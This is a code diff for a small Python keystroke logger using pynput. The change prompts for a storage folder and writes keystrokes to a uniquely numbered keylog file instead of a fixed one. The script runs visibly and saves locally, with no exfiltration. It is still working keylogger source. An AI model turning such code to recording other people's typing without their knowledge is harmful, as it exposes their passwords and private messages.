@@ -1,8 +1,22 @@
+import os
 import numpy as np
-import pyautogui as pg
-import pygetwindow as gw
 import pynput
 from pynput.keyboard import Key, Listener
+
+#Poll user where to store keylogs
+print('Input file location for storing keylogs')
+print('Example: C:/Users/USERNAME/Desktop')
+filepath = input()
+#Ensure filepath exists
+while not os.path.exists(filepath):
+        print('Folder not found, please enter existing folder location')
+        filepath = input()
+
+#Check what to call keylog file and set file name
+i = 0
+while os.path.exists(filepath + '/keylog' + str(i) + '.txt'):
+    i+=1
+file_name = '/keylog' + str(i) + '.txt'
 
 keys = []
 
@@ -11,7 +25,7 @@ def on_press(key):
     write_file(keys)
           
 def write_file(keys):
-    with open('keylog.txt', 'w') as f:
+    with open(filepath + file_name, 'w') as f:
         for key in keys:
             # removing '' and writing to file
             f.write(str(key).replace("'", ""))
